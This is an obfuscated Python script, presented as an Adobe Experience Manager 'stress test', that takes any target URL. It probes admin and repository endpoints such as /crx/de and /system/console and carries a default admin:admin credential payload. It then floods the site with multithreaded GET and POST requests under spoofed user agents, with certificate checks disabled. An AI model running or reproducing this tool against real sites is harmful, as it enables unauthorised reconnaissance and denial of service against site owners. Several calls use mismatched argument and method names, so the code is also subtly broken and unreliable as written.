lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl, llllllllllllIII, lllllllllllIlll = Exception, __name__, int, range, bool, input, KeyboardInterrupt, print, str

from requests.packages.urllib3 import disable_warnings as IIlIIIIIIIlIlI
from random import choice as IlIIlllIlllIll, uniform as lIllIllIIIIIIl
from requests import head as lIllIlIIlIlIlI, post as lIIIIIIlllIIIl, get as llIlIIIIlIlllI
from time import sleep as llIIlllIIIIllI, time as IllIIIlIlIIIll
from concurrent.futures import ThreadPoolExecutor as IIIIlllllllllI
from requests.exceptions import RequestException as IlIlIlllIIIllI
from urllib3.exceptions import InsecureRequestWarning as IIlIllllIlIIll
from typing import List as lIIlIIIIlllIll, Dict as IlIlIllIIlllIl, Optional as lllIIIIllIIIll
IIlIIIIIIIlIlI(IIlIllllIlIIll)

class lIlIlIIlIIlIIIIIll:

    def __init__(IllIlIllIlIlIIIllI):
        IllIlIllIlIlIIIllI.llllIIIllIllIIllIl = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0']
        IllIlIllIlIlIIIllI.lIllIllIIIllllIlIl = {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/json'}
        IllIlIllIlIlIIIllI.IllllllIIllIIIlllI = ['/libs/granite/core/content/login.html', '/crx/de/index.jsp', '/system/console', '/crx/explorer/browser/index.jsp', '/libs/cq/core/content/welcome.html', '/aem/start.html', '/content.infinity.json', '/system/sling/cqform/defaultlogin.html', '/etc.json', '/content/dam.json', '/system/console/bundles', '/system/console/configMgr', '/system/console/status-productinfo', '/bin/querybuilder.json', '/libs/granite/core/content/login', '/apps.tidy.infinity.json', '/content/usergenerated', '/system/health', '/.cqactions.json', '/content/screens', '/content/communities', '/content/forms']
        IllIlIllIlIlIIIllI.IlIIlIlllllIIlIllI = {'auth_test': {'j_username': 'admin', 'j_password': 'admin', 'j_validate': 'true'}, 'query_test': {'path': '/content', 'type': 'cq:Page', 'p.limit': '1'}}

    def IIlIIIIlllllIIIllI(IllIlIllIlIlIIIllI) -> lllllllllllIlll:
        return IlIIlllIlllIll(IllIlIllIlIlIIIllI.llllIIIllIllIIllIl)

    def lIIllIllIIlIlIIIlI(IllIlIllIlIlIIIllI, lllIIIIIIlIIIIIlll: lllllllllllIlll, lIIIllIIIIlllIllII: lllllllllllIlll) -> llllllllllllIll:
        """Verify if an AEM endpoint is accessible"""
        lllIIlllllIlIIIlII = f"{lllIIIIIIlIIIIIlll.rstrip('/')}/{lIIIllIIIIlllIllII.lstrip('/')}"
        try:
            IlIlIIlIlIlIIIllll = lIllIlIIlIlIlI(lllIIlllllIlIIIlII, headers={'User-Agent': IllIlIllIlIlIIIllI.IIlIIIIlllllIIIllI()}, timeout=5, verify=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
            return 200 <= IlIlIIlIlIlIIIllll.status_code < 404
        except:
            return llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)

    def IIlIIlllIIlIlllIll(IllIlIllIlIlIIIllI, lllIIIIIIlIIIIIlll: lllllllllllIlll) -> lIIlIIIIlllIll[lllllllllllIlll]:
        """Discover valid AEM endpoints"""
        llllllllllllIII('[INFO] Discovering valid AEM endpoints...')
        IIIIIlIIIllIIllIIl = []
        IlIllllllIlIIlllIl = ['/content/geometrixx', '/content/we-retail', '/system/console/jmx', '/system/console/profiler', '/system/console/diskbenchmark', '/libs/granite/core/content/homepage.html', '/mnt/overlay', '/var/audit', '/var/statistics']
        IllIlIllIlIlIIIllI.IllllllIIllIIIlllI.extend(IlIllllllIlIIlllIl)
        for lIIIllIIIIlllIllII in IllIlIllIlIlIIIllI.IllllllIIllIIIlllI:
            if IllIlIllIlIlIIIllI.lIIllIllIIlIlIIIlI(lllIIIIIIlIIIIIlll, lIIIllIIIIlllIllII):
                llllllllllllIII(f'[SUCCESS] Found valid AEM endpoint: {lIIIllIIIIlllIllII}')
                IIIIIlIIIllIIllIIl.append(lIIIllIIIIlllIllII)
        return IIIIIlIIIllIIllIIl or IllIlIllIlIlIIIllI.IllllllIIllIIIlllI

    def lIlllllIIllIIIIIIl(IllIlIllIlIlIIIllI, lllIIIIIIlIIIIIlll: lllllllllllIlll) -> lllIIIIllIIIll[lllllllllllIlll]:
        """Try to determine AEM version"""
        llIIIIIIllllIlIlll = ['/system/console/status-productinfo', '/system/console/bundles.json']
        for lIIIllIIIIlllIllII in llIIIIIIllllIlIlll:
            try:
                IlIlIIlIlIlIIIllll = llIlIIIIlIlllI(f"{lllIIIIIIlIIIIIlll.rstrip('/')}/{lIIIllIIIIlllIllII.lstrip('/')}", headers={'User-Agent': IllIlIllIlIlIIIllI.IIlIIIIlllllIIIllI()}, verify=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), timeout=5)
                if IlIlIIlIlIlIIIllll.ok and 'AEM' in IlIlIIlIlIlIIIllll.text:
                    return IlIlIIlIlIlIIIllll.text
            except:
                continue
        return None

    def IlllIIIIlIIIllIIlI(IllIlIllIlIlIIIllI, IIIlIllIlIIIIllIlI: lllllllllllIlll, lllIIIIIIlIIIIIlll: lllllllllllIlll, lIIIllIIIIlllIllII: lllllllllllIlll, IllllIllIIIlllIIlI: IlIlIllIIlllIl=None) -> lllIIIIllIIIll[lllllllllllIlll]:
        lllIIlllllIlIIIlII = f"{lllIIIIIIlIIIIIlll.rstrip('/')}/{lIIIllIIIIlllIllII.lstrip('/')}"
        IllIlIllIlIlIIIllI.lIllIllIIIllllIlIl['User-Agent'] = IllIlIllIlIlIIIllI.IIlIIIIlllllIIIllI()
        try:
            if IIIlIllIlIIIIllIlI.upper() == 'GET':
                IlIlIIlIlIlIIIllll = llIlIIIIlIlllI(lllIIlllllIlIIIlII, headers=IllIlIllIlIlIIIllI.lIllIllIIIllllIlIl, timeout=5, verify=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
            else:
                IlIlIIlIlIlIIIllll = lIIIIIIlllIIIl(lllIIlllllIlIIIlII, json=IllllIllIIIlllIIlI, headers=IllIlIllIlIlIIIllI.lIllIllIIIllllIlIl, timeout=5, verify=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
            llllllllllllIII(f'[{IlIlIIlIlIlIIIllll.status_code}] {IIIlIllIlIIIIllIlI} {lllIIlllllIlIIIlII}')
            return IlIlIIlIlIlIIIllll.text if IlIlIIlIlIlIIIllll.ok else None
        except IlIlIlllIIIllI as llIIlIIlIIIllllIII:
            llllllllllllIII(f'[ERROR] {IIIlIllIlIIIIllIlI} {lllIIlllllIlIIIlII}: {llIIlIIlIIIllllIII}')
            return None

    def lIIIllIIlllllIlIIl(IllIlIllIlIlIIIllI, lllIIIIIIlIIIIIlll: lllllllllllIlll, llIlIlIlIllIIIIlII: lllllllllllllIl=10, llIIlIlIIIlIIIIlIl: lllllllllllllIl=60):
        """Execute stress test on AEM instance"""
        llllllllllllIII(f'[INFO] Starting AEM stress test on {lllIIIIIIlIIIIIlll} for {llIIlIlIIIlIIIIlIl}s with {llIlIlIlIllIIIIlII} workers')
        IIIlIllIlIlIIlIllI = IllIlIllIlIlIIIllI.lIlllllIIllIIIIIIl(lllIIIIIIlIIIIIlll)
        if IIIlIllIlIlIIlIllI:
            llllllllllllIII(f'[INFO] Detected AEM instance: {IIIlIllIlIlIIlIllI}')
        IIIIIlIIIllIIllIIl = IllIlIllIlIlIIIllI.IIlIIlllIIlIlllIll(lllIIIIIIlIIIIIlll)
        if not IIIIIlIIIllIIllIIl:
            llllllllllllIII('[WARNING] No valid AEM endpoints found. Using default endpoints.')
        IIllIIIlIllIIlllIl = IllIIIlIlIIIll()

        def lllIllIIllIlIlIIll():
            while IllIIIlIlIIIll() - IIllIIIlIllIIlllIl < llIIlIlIIIlIIIIlIl:
                lIIIllIIIIlllIllII = IlIIlllIlllIll(IllIlIllIlIlIIIllI.IllllllIIllIIIlllI)
                IIIlIllIlIIIIllIlI = IlIIlllIlllIll(['GET', 'POST'])
                lIIlIllIlIlIllIIlI = IllIlIllIlIlIIIllI.IlIIlIlllllIIlIllI['query_test'] if IIIlIllIlIIIIllIlI == 'POST' else None
                lIIllIlIIlIllIlIII = IllIlIllIlIlIIIllI.IlllIIIIlIIIllIIlI(IIIlIllIlIIIIllIlI, lllIIIIIIlIIIIIlll, lIIIllIIIIlllIllII, data=lIIlIllIlIlIllIIlI)
                if lIIllIlIIlIllIlIII:
                    llIIlllIIIIllI(lIllIllIIIIIIl(0.1, 0.3))
                else:
                    llIIlllIIIIllI(lIllIllIIIIIIl(0.5, 1.0))
        with IIIIlllllllllI(max_workers=llIlIlIlIllIIIIlII) as lIlIlIIllIlIllIlIl:
            llllIIIlIIIIIIIIII = [lIlIlIIllIlIllIlIl.submit(lllIllIIllIlIlIIll) for IIlIIIIIlllllIIIIl in lllllllllllllII(llIlIlIlIllIIIIlII)]
            for lllIllIlIllIlIIIII in llllIIIlIIIIIIIIII:
                lllIllIlIllIlIIIII.lIIllIlIIlIllIlIII()

def lIlllllllIIlIIllll():
    IIlllIlIIlIIlIIllI = llllllllllllIlI('Enter target AEM URL (e.g., https://example.com): ').strip()
    if not (IIlllIlIIlIIlIIllI.startswith('http://') or IIlllIlIIlIIlIIllI.startswith('https://')):
        llllllllllllIII('[ERROR] Invalid URL. Please include http:// or https://')
        return
    try:
        lllIlIIIIlIllllIII = lIlIlIIlIIlIIIIIll()
        llIlIlIlIllIIIIlII = lllllllllllllIl(llllllllllllIlI('Enter number of workers (default: 20): ') or '20')
        llIIlIlIIIlIIIIlIl = lllllllllllllIl(llllllllllllIlI('Enter duration in seconds (default: 120): ') or '120')
        lllIlIIIIlIllllIII.lIIIllIIlllllIlIIl(IIlllIlIIlIIlIIllI, workers=llIlIlIlIllIIIIlII, duration=llIIlIlIIIlIIIIlIl)
    except llllllllllllIIl:
        llllllllllllIII('\n[INFO] Test interrupted by user.')
    except lllllllllllllll as llIIlIIlIIIllllIII:
        llllllllllllIII(f'[ERROR] Unexpected error occurred: {llIIlIIlIIIllllIII}')
if llllllllllllllI == '__main__':
    lIlllllllIIlIIllll()
